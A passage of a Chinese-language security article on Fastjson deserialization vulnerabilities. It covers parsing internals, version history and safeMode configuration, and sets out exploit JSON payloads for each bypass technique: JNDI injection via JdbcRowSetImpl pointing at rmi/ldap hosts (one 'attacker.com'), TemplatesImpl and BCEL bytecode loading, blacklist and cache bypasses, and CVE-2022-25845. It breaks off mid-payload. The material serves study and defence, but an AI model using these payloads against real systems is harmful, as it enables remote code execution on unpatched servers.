class="code"><pre><code class="hljs java">ParserConfig.checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features)<br></code></pre></td></tr></table></figure><ul><li>黑白名单匹配</li><li>哈希值快速比对</li><li>expectClass 参数影响校验逻辑</li><li>可能的绕过点和安全漏洞</li></ul><p><strong>方法调用节点</strong></p><ul><li>构造函数调用：对象实例化时</li><li>Setter 方法调用：属性赋值时</li><li>Getter 方法调用：引用解析、类型转换时</li><li>特殊方法调用：hashCode、equals、toString 等</li></ul><h2 id="2-3-攻击向量与利用链"><a href="#2-3-攻击向量与利用链" class="headerlink" title="2.3 攻击向量与利用链"></a>2.3 攻击向量与利用链</h2><h3 id="2-3-1-经典攻击向量"><a href="#2-3-1-经典攻击向量" class="headerlink" title="2.3.1 经典攻击向量"></a>2.3.1 经典攻击向量</h3><p><strong>JNDI 注入攻击</strong></p><ul><li><strong>支持协议</strong>：RMI、LDAP、DNS</li><li><strong>攻击流程</strong>：@type 指定 JndiDataSourceLookup 等类 → setter 方法触发 JNDI 查询 → 远程加载恶意类</li><li><strong>环境限制</strong>：高版本 JDK 对远程类加载有限制（如 trustURLCodebase&#x3D;false）</li></ul><p><strong>模板类利用</strong></p><ul><li><strong>TemplatesImpl 攻击链</strong>：通过模板引擎加载恶意字节码</li><li><strong>ScriptEngineManager</strong>：脚本引擎执行恶意代码</li><li><strong>适用场景</strong>：不出网环境下的本地代码执行</li></ul><p><strong>第三方组件利用</strong></p><ul><li><strong>数据库连接池</strong>：c3p0、Tomcat-DBCP、HikariCP</li><li><strong>ORM 框架组件</strong>：MyBatis、Hibernate 相关类</li><li><strong>Web 框架组件</strong>：Spring、XBean 等框架类</li></ul><h3 id="2-3-2-环境依赖分析"><a href="#2-3-2-环境依赖分析" class="headerlink" title="2.3.2 环境依赖分析"></a>2.3.2 环境依赖分析</h3><p><strong>JDK 版本差异</strong></p><table><thead><tr><th align="left"><strong>JDK 版本</strong></th><th align="left"><strong>限制措施</strong></th><th align="left"><strong>影响</strong></th></tr></thead><tbody><tr><td align="left">JDK 8u121+</td><td align="left">默认限制 RMI 远程加载</td><td align="left">RMI 攻击向量失效</td></tr><tr><td align="left">JDK 8u191+</td><td align="left">默认限制 LDAP 远程加载</td><td align="left">LDAP 攻击向量失效</td></tr><tr><td align="left">JDK 11+</td><td align="left">移除部分内部类</td><td align="left">BCEL 等利用链失效</td></tr></tbody></table><p><strong>网络环境影响</strong></p><ul><li><strong>出网环境</strong>：可利用远程 JNDI 服务</li><li><strong>不出网环境</strong>：依赖本地类库和二次反序列化</li><li><strong>内网环境</strong>：可能存在内网 RMI&#x2F;LDAP 服务</li></ul><h2 id="2-4-安全机制与防护"><a href="#2-4-安全机制与防护" class="headerlink" title="2.4 安全机制与防护"></a>2.4 安全机制与防护</h2><h3 id="2-4-1-版本演进与安全改进"><a href="#2-4-1-版本演进与安全改进" class="headerlink" title="2.4.1 版本演进与安全改进"></a>2.4.1 版本演进与安全改进</h3><p><strong>1.2.24 及之前版本</strong></p><ul><li>autoType 默认开启</li><li>缺乏有效的安全校验机制</li><li>安全风险最高</li></ul><p><strong>1.2.25 - 1.2.67 版本</strong></p><ul><li>autoType 默认关闭</li><li>引入黑白名单机制</li><li>但存在多种绕过方法</li></ul><p><strong>1.2.68+ 版本</strong></p><ul><li>引入 safeMode 安全模式</li><li>加强类型校验逻辑</li><li>持续修复绕过漏洞</li></ul><h3 id="2-4-2-关键安全配置"><a href="#2-4-2-关键安全配置" class="headerlink" title="2.4.2 关键安全配置"></a>2.4.2 关键安全配置</h3><p><strong>autoType 控制</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 开启 autoType（不推荐）</span><br>ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// 添加白名单</span><br>ParserConfig.getGlobalInstance().addAccept(<span class="hljs-string">&quot;com.example.safe.Class&quot;</span>);<br><br><span class="hljs-comment">// 启用安全模式（推荐）</span><br>ParserConfig.getGlobalInstance().setSafeMode(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p><strong>Feature 特性控制</strong></p><ul><li><code>SupportNonPublicField</code>：支持私有字段序列化</li><li><code>FieldBased</code>：基于字段而非 setter&#x2F;getter</li><li><code>DisableCircularReferenceDetect</code>：禁用循环引用检测</li><li><code>IgnoreNotMatch</code>：忽略不匹配字段</li></ul><h3 id="2-4-3-攻击面评估"><a href="#2-4-3-攻击面评估" class="headerlink" title="2.4.3 攻击面评估"></a>2.4.3 攻击面评估</h3><p><strong>解析方法风险对比</strong></p><table><thead><tr><th align="left"><strong>方法</strong></th><th align="left"><strong>风险级别</strong></th><th align="left"><strong>原因</strong></th></tr></thead><tbody><tr><td align="left"><code>JSON.parse()</code></td><td align="left">高</td><td align="left">完全依赖 JSON 中的 @type</td></tr><tr><td align="left"><code>JSON.parseObject(json, Class)</code></td><td align="left">中</td><td align="left">仍可能通过嵌套 @type 触发</td></tr><tr><td align="left"><code>JSON.parseArray()</code></td><td align="left">中</td><td align="left">数组元素中的 @type 风险</td></tr></tbody></table><p><strong>典型利用场景</strong></p><ol><li><strong>Web 接口</strong>：接受 JSON 数据的 HTTP 接口</li><li><strong>消息队列</strong>：处理序列化消息的消费者</li><li><strong>缓存系统</strong>：从缓存中反序列化数据</li><li><strong>配置文件</strong>：解析 JSON 格式的配置文件</li><li><strong>日志系统</strong>：处理包含 JSON 数据的日志</li></ol><h2 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5 总结"></a>2.5 总结</h2><p>Fastjson 漏洞的根本原因在于其设计理念中对灵活性的过度追求，以及对用户输入的过度信任。通过 <code>@type</code> 字段实现的动态类型指定功能，虽然提供了强大的序列化能力，但同时也为攻击者提供了控制程序执行流程的入口。</p><p>理解 Fastjson 的反序列化流程和关键安全机制，对于识别和防护相关安全风险至关重要。在实际应用中，应该采用最新版本的 Fastjson，启用安全模式，并严格控制可序列化的类型范围。</p><h1 id="三、Fastjson反序列化漏洞利用分析"><a href="#三、Fastjson反序列化漏洞利用分析" class="headerlink" title="三、Fastjson反序列化漏洞利用分析"></a>三、Fastjson反序列化漏洞利用分析</h1><h2 id="3-1-Fastjson漏洞时间线概"><a href="#3-1-Fastjson漏洞时间线概" class="headerlink" title="3.1 Fastjson漏洞时间线概"></a>3.1 Fastjson漏洞时间线概</h2><p>Fastjson反序列化漏洞主要围绕<code>@type</code>字段<code>autoType</code>机制展开。从最初的1.2.24版本到后续版本，阿里巴巴不断修补漏洞，而安全研究者也在持续寻找绕过方法，形成了一攻防对抗”的演进过程</p><h2 id="3-2-早期漏洞利用-1-2-24及之前版本"><a href="#3-2-早期漏洞利用-1-2-24及之前版本" class="headerlink" title="3.2 早期漏洞利用 1.2.24及之前版本"></a>3.2 早期漏洞利用 1.2.24及之前版本</h2><h3 id="3-2-1-JdbcRowSetImpl利用"><a href="#3-2-1-JdbcRowSetImpl利用" class="headerlink" title="3.2.1 JdbcRowSetImpl利用"></a>3.2.1 JdbcRowSetImpl利用</h3><p><strong>影响版本</strong> Fastjson 1.2.24</p><p><strong>漏洞原理</strong></p><ul><li><code>com.sun.rowset.JdbcRowSetImpl</code>类在调用<code>setAutoCommit()</code>方法时，会触<code>connect()</code>方法</li><li><code>connect()</code>方法会尝试连接<code>dataSourceName</code>指定的数据源</li><li>通过控制<code>dataSourceName</code>为JNDI服务地址，可触发JNDI注入</li></ul><p><strong>Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>攻击流程</strong></p><ol><li>Fastjson解析JSON时识别<code>@type</code>为<code>JdbcRowSetImpl</code></li><li>实例化<code>JdbcRowSetImpl</code>对象</li><li>调用<code>setDataSourceName()</code>设置数据源</li><li>调用<code>setAutoCommit(true)</code>触发<code>connect()</code>方法</li><li><code>connect()</code>方法中调用<code>lookup(dataSourceName)</code>导致JNDI注入</li></ol><h3 id="3-2-2-TemplatesImpl利用"><a href="#3-2-2-TemplatesImpl利用" class="headerlink" title="3.2.2 TemplatesImpl利用"></a>3.2.2 TemplatesImpl利用</h3><p><strong>影响版本</strong> Fastjson 1.2.24</p><p><strong>漏洞原理</strong></p><ul><li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类可加载字节码</li><li>通过<code>_bytecodes</code>字段注入恶意类的字节码</li><li>调用<code>getOutputProperties()</code>方法时会触发<code>newTransformer()</code></li><li><code>newTransformer()</code>中调用<code>defineTransletClasses()</code>实例化字节码中的类</li></ul><p><strong>限制条件</strong></p><ul><li>需要开启<code>Feature.SupportNonPublicField</code>特性</li><li>因为<code>_bytecodes</code>等字段是私有字段，正常情况下无法设置</li></ul><p><strong>Payload示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<br>    <span class="hljs-string">&quot;_bytecodes&quot;</span>: [<span class="hljs-string">&quot;[base64编码的恶意class字节码]&quot;</span>],<br>    <span class="hljs-string">&quot;_name&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>,<br>    <span class="hljs-string">&quot;_tfactory&quot;</span>: &#123;&#125;,<br>    <span class="hljs-string">&quot;_outputProperties&quot;</span>: &#123;&#125;,<br>    <span class="hljs-string">&quot;_version&quot;</span>: <span class="hljs-string">&quot;1.0&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-黑名单绕过（1-2-25-1-2-47）"><a href="#3-3-黑名单绕过（1-2-25-1-2-47）" class="headerlink" title="3.3 黑名单绕过（1.2.25-1.2.47）"></a>3.3 黑名单绕过（1.2.25-1.2.47）</h2><h3 id="3-3-1-checkAutoType机制引入"><a href="#3-3-1-checkAutoType机制引入" class="headerlink" title="3.3.1 checkAutoType机制引入"></a>3.3.1 checkAutoType机制引入</h3><p><strong>版本变化</strong> Fastjson 1.2.25</p><p>Fastjson 1.2.25版本引入<code>checkAutoType()</code>函数，通过黑白名单机制来防御反序列化攻击：</p><ul><li><code>denyList</code>（黑名单）：禁止的类名列表</li><li><code>acceptList</code>（白名单）：允许的类名列表</li><li><code>autoTypeSupport</code>：默认为<code>false</code>，是否开启autoType支持</li></ul><p><strong>黑名单包含的关键类：</strong></p><ul><li><code>com.sun.rowset.JdbcRowSetImpl</code></li><li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li><li><code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase</code></li></ul><h3 id="3-3-2-L-绕过方法"><a href="#3-3-2-L-绕过方法" class="headerlink" title="3.3.2 L;绕过方法"></a>3.3.2 L;绕过方法</h3><p><strong>影响版本</strong> Fastjson 1.2.25 - 1.2.41</p><p><strong>绕过原理</strong></p><ul><li>Fastjson在处理类名时，会去除开头的<code>L</code>和结尾的<code>;</code></li><li>通过在类名前添加<code>L</code>，结尾添加<code>;</code>来绕过黑名单检测</li></ul><p><strong>Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;rmi://127.0.0.1:1399/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>前提条件</strong> 需要<code>autoTypeSupport</code>属性为<code>true</code>，1.2.25+默认为<code>false</code></p><h3 id="3-3-3-LL-绕过方法"><a href="#3-3-3-LL-绕过方法" class="headerlink" title="3.3.3 LL;;绕过方法"></a>3.3.3 LL;;绕过方法</h3><p><strong>影响版本</strong> Fastjson 1.2.25 - 1.2.42</p><p><strong>绕过原理</strong></p><ul><li>双重<code>L</code>和<code>;</code>符号绕过，利用多次处理的逻辑缺陷</li></ul><p><strong>Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://127.0.0.1:1399/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-3-4-字符绕过方法"><a href="#3-3-4-字符绕过方法" class="headerlink" title="3.3.4 [字符绕过方法"></a>3.3.4 [字符绕过方法</h3><p><strong>影响版本</strong> Fastjson 1.2.25 - 1.2.43</p><p><strong>绕过原理</strong></p><ul><li>利用数组类型的处理逻辑，在类名前添加<code>[</code>字符</li></ul><p><strong>Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;&#125;,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://127.0.0.1:1399/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-3-5-其他利用"><a href="#3-3-5-其他利用" class="headerlink" title="3.3.5 其他利用"></a>3.3.5 其他利用</h3><p><strong>Mybatis JndiDataSourceFactory利用链：</strong></p><p><strong>影响版本</strong> Fastjson 1.2.25 - 1.2.45</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<br>    <span class="hljs-string">&quot;properties&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://127.0.0.1:1399/Exploit&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-4-缓存绕过（1-2-25-1-2-47）"><a href="#3-4-缓存绕过（1-2-25-1-2-47）" class="headerlink" title="3.4 缓存绕过（1.2.25-1.2.47）"></a>3.4 缓存绕过（1.2.25-1.2.47）</h2><h3 id="3-4-1-java-lang-Class缓存绕过"><a href="#3-4-1-java-lang-Class缓存绕过" class="headerlink" title="3.4.1 java.lang.Class缓存绕过"></a>3.4.1 java.lang.Class缓存绕过</h3><p><strong>影响版本</strong> Fastjson 1.2.33 - 1.2.47</p><p><strong>绕过原理</strong></p><ul><li>通过<code>java.lang.Class</code>将目标类加载到缓存中</li><li>缓存中的类在后续反序列化时不会再次经过<code>checkAutoType</code>检测</li><li>1.2.48之后缓存机制被改为默认关闭</li></ul><p><strong>Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;rmi://127.0.0.1:1399/Exploit&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-5-高版本绕过技术（1-2-48-）"><a href="#3-5-高版本绕过技术（1-2-48-）" class="headerlink" title="3.5 高版本绕过技术（1.2.48+）"></a>3.5 高版本绕过技术（1.2.48+）</h2><h3 id="3-5-1-expectClass绕过（1-2-68）"><a href="#3-5-1-expectClass绕过（1-2-68）" class="headerlink" title="3.5.1 expectClass绕过（1.2.68）"></a>3.5.1 expectClass绕过（1.2.68）</h3><p><strong>影响版本</strong> Fastjson 1.2.68</p><p><strong>绕过原理</strong></p><ul><li>利用<code>expectClass</code>参数绕过<code>checkAutoType()</code>检测</li><li>主要使用<code>Throwable</code>和<code>AutoCloseable</code>接口进行绕过</li></ul><h3 id="3-5-2-BCEL-ClassLoader利用"><a href="#3-5-2-BCEL-ClassLoader利用" class="headerlink" title="3.5.2 BCEL ClassLoader利用"></a>3.5.2 BCEL ClassLoader利用</h3><p><strong>影响版本</strong> 适用于多个版本（Java 8u251之前）</p><p><strong>绕过原理</strong></p><ul><li><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>在加载类时，如果类名包含<code>$$BCEL$$</code></li><li>会对<code>$$BCEL$$</code>后的字符串进行BCEL解码，作为类的字节码</li><li>通过<code>defineClass()</code>创建Class对象，实现任意代码执行</li></ul><p><strong>Tomcat DBCP利用链：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;x&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,<br>        <span class="hljs-string">&quot;driverClassLoader&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;driverClassName&quot;</span>: <span class="hljs-string">&quot;$$BCEL$$[BCEL编码的恶意字节码]&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Mybatis利用链：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<br>    <span class="hljs-string">&quot;driverClassLoader&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;driver&quot;</span>: <span class="hljs-string">&quot;$$BCEL$$[BCEL编码的恶意字节码]&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意</strong> Java 8u251之后，BCEL相关类被移除，此利用方法失效</p><h3 id="3-5-3-XBean-JNDI利用"><a href="#3-5-3-XBean-JNDI利用" class="headerlink" title="3.5.3 XBean JNDI利用"></a>3.5.3 XBean JNDI利用</h3><p><strong>XBean JndiConverter</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<br>    <span class="hljs-string">&quot;AsText&quot;</span>: <span class="hljs-string">&quot;rmi://127.0.0.1:1098/exploit&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Cocoon JMSContentInterceptor</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>,<br>    <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.util.Hashtable&quot;</span>,<br>        <span class="hljs-string">&quot;java.naming.factory.initial&quot;</span>: <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<br>        <span class="hljs-string">&quot;topic-factory&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-6-safeMode绕过（1-2-68-）"><a href="#3-6-safeMode绕过（1-2-68-）" class="headerlink" title="3.6 safeMode绕过（1.2.68+）"></a>3.6 safeMode绕过（1.2.68+）</h2><h3 id="3-6-1-safeMode机制"><a href="#3-6-1-safeMode机制" class="headerlink" title="3.6.1 safeMode机制"></a>3.6.1 safeMode机制</h3><p><strong>版本引入</strong> Fastjson 1.2.68+</p><p><strong>安全机制</strong></p><ul><li><code>safeMode</code>开启后，完全禁用<code>autoType</code>功能</li><li>即使配置了白名单，在<code>safeMode</code>模式下也会失效</li><li>这是Fastjson最严格的安全模式</li></ul><p><strong>配置方式</strong></p><ol><li>代码配置<code>ParserConfig.getGlobalInstance().setSafeMode(true)</code></li><li>JVM参数<code>-Dfastjson.parser.safeMode=true</code></li><li>配置文件：在<code>fastjson.properties</code>中设置</li></ol><h3 id="3-6-2-1-2-68-1-2-80版本绕过机制"><a href="#3-6-2-1-2-68-1-2-80版本绕过机制" class="headerlink" title="3.6.2 1.2.68-1.2.80版本绕过机制"></a>3.6.2 1.2.68-1.2.80版本绕过机制</h3><p><strong>绕过原理</strong> 1.2.68版本将<code>java.lang.Runnable</code>、<code>java.lang.Readable</code>、<code>java.lang.AutoCloseable</code>加入黑名单，但可以通过异常<code>Throwable</code>作为期望类进行绕过</p><p><strong>利用条件</strong></p><ul><li>目标类必须继承自<code>Throwable</code></li><li>应用未开启<code>safeMode</code>模式</li><li>使用<code>JSON.parse</code>或<code>JSON.parseObject</code>且未指定具体类型</li></ul><p><strong>示例Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-7-CVE-2022-25845-1-2-80"><a href="#3-7-CVE-2022-25845-1-2-80" class="headerlink" title="3.7 CVE-2022-25845 (1.2.80)"></a>3.7 CVE-2022-25845 (1.2.80)</h2><h3 id="3-7-1-漏洞概述"><a href="#3-7-1-漏洞概述" class="headerlink" title="3.7.1 漏洞概述"></a>3.7.1 漏洞概述</h3><p><strong>CVE编号</strong> CVE-2022-25845</p><p><strong>CVSS评分</strong> 8.1（高危）</p><p><strong>影响版本</strong> Fastjson 1.2.80及以下版本</p><p><strong>修复版本</strong> 1.2.83+</p><h3 id="3-7-2-漏洞原理"><a href="#3-7-2-漏洞原理" class="headerlink" title="3.7.2 漏洞原理"></a>3.7.2 漏洞原理</h3><p><strong>核心机制</strong> 该漏洞利用了Fastjson在处理<code>Throwable</code>类型时的特殊逻辑，绕过了<code>checkAutoType</code>安全检查 </p><p><strong>关键代码路径</strong></p><ol><li><code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer</code>检测目标类是否继承<code>Throwable</code></li><li>如果是，则调用<code>ThrowableDeserializer.deserialize()</code></li><li><code>ThrowableDeserializer#createException</code>中实现代码执行</li></ol><h3 id="3-7-3-利用条件与限"><a href="#3-7-3-利用条件与限" class="headerlink" title="3.7.3 利用条件与限"></a>3.7.3 利用条件与限</h3><p><strong>利用条件</strong></p><ul><li>Fastjson版本 ≤ 1.2.80</li><li>未开启<code>safeMode</code>模式</li><li>应用调用<code>JSON.parse</code>或<code>JSON.parseObject</code>且未指定具体类型</li><li>传入用户可控的JSON数据</li></ul><p><strong>利用限制</strong></p><ul><li>只能调用继承<code>Throwable</code>类的反序列化gadget</li><li>实际可利用的gadget类相对有限</li></ul><h3 id="3-7-4-利用Payload"><a href="#3-7-4-利用Payload" class="headerlink" title="3.7.4 利用Payload"></a>3.7.4 利用Payload</h3><p><strong>基础绕过Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;rmi://attacker.com:1099/exploit&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>BCEL字节码注入：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,<br>    <span class="hljs-string">&quot;driverClassLoader&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;driverClassName&quot;</span>: <span class="hljs-string">&quot;$$BCEL$$[恶意字节码]&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>组合利用链：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<br>    <span class="hljs-string">&quot;x&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span 